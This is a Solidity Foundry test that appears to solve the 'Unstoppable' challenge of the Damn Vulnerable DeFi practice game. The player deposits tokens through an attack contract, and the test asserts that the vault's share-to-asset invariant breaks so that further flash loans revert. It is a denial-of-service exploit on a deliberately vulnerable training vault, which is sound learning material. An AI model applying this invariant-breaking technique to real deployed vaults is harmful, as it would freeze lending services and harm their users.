// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {UnstoppableVault} from "../../src/unstoppable/UnstoppableVault.sol";
import {UnstoppableVaultAttack} from "../../src/unstoppable/UnstoppableVaultAttack.sol";
import {ReceiverUnstoppable} from "../../src/unstoppable/ReceiverUnstoppable.sol";
import {SafeTransferLib, ERC4626, ERC20} from "solmate/src/mixins/ERC4626.sol";

import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WETH9} from "../../src/WETH9.sol";
import {Utilities} from "../utils/Utilities.sol";
import "solmate/src/utils/FixedPointMathLib.sol";

contract UnstoppableTest is Test {
    DamnValuableToken token;
    UnstoppableVault vault;
    ReceiverUnstoppable receiver;
    UnstoppableVaultAttack attacker;
    address owner;
    address player;
    uint256 balance = 1_000_000 ether;
    using FixedPointMathLib for uint256;

    function setUp() public {
        owner = makeAddr("owner");
        player = makeAddr("player");

        token = new DamnValuableToken();
        vault = new UnstoppableVault(
            ERC20(address(token)),
            address(owner),
            address(owner)
        );

        assertEq(vault.asset() == ERC20(address(token)), true);

        token.approve(address(vault), balance);
        vault.deposit(balance, owner);

        assertEq(token.balanceOf(address(vault)) == balance, true);
        assertEq(vault.totalAssets() == balance, true);
        assertEq(vault.totalSupply() == balance, true);
        assertEq(vault.maxFlashLoan(address(token)) == balance, true);

        assertEq(vault.flashFee(address(token), balance - 1) == 0, true);
        assertEq(vault.flashFee(address(token), balance) == 50000 ether, true);

        deal(address(token), player, 50 ether);

        assertEq(token.balanceOf(player) == 50 ether, true);

        receiver = new ReceiverUnstoppable(address(vault));
        attacker = new UnstoppableVaultAttack(address(vault));

        vm.label(address(vault), "Vault");
        vm.label(address(token), "DVT");
        vm.label(address(receiver), "Receiver");
        vm.label(address(attacker), "Attacker");
    }

    function testUnstoppableExploit() public {
        vm.prank(player, player);
        token.approve(address(vault), 2 ether);
        vm.prank(player, player);
        vault.deposit(2 ether, address(attacker));

        // Check vault balances, after flash loan is complete
        // ERC20 balance
        assertEq(token.balanceOf(address(vault)), balance + 2 ether);
        // ERC4626 shares balance
        assertEq(vault.totalAssets(), balance + 2 ether);

        // // invariant is balanced 1:1
        assertEq(vault.convertToShares(1), 1);

        // assertEq(vault.previewWithdraw(2), 2);
        attacker.executeFlashLoan(2 ether);

        // console.log(vault.totalSupply()); // Total Shares
        // console.log(vault.totalAssets()); // Vault ERC20 balance

        uint256 asset = 1; // represent 1 wei callback sent via withdraw
        uint256 totalSupply = vault.totalSupply();
        uint256 totalAssets = vault.totalAssets();

        // previewWithdraw
        // returns expected during normal flash loan exectution
        assertEq(asset.mulDivUp(totalSupply, totalAssets), asset);
        assertEq(asset.mulDivUp(1_000_000e18, 1_000_000e18), asset);

        // returns a rounded up number when called from onFlashLoan callback
        // as totalAssets will not include borrowed amount
        assertEq(asset.mulDivUp(totalSupply, balance), 2);
        assertEq(asset.mulDivUp(1_000_002e18, 1_000_000e18), 2);

        // invariant is no longer balanced 1:1
        assertEq(vault.convertToShares(1), 0); // mulDivDown

        // selector for revert message
        bytes4 InvalidBalance = 0xc52e3eff;

        // Flash loans are no longer possible
        vm.expectRevert(InvalidBalance);
        receiver.executeFlashLoan(100 ether);
    }
}
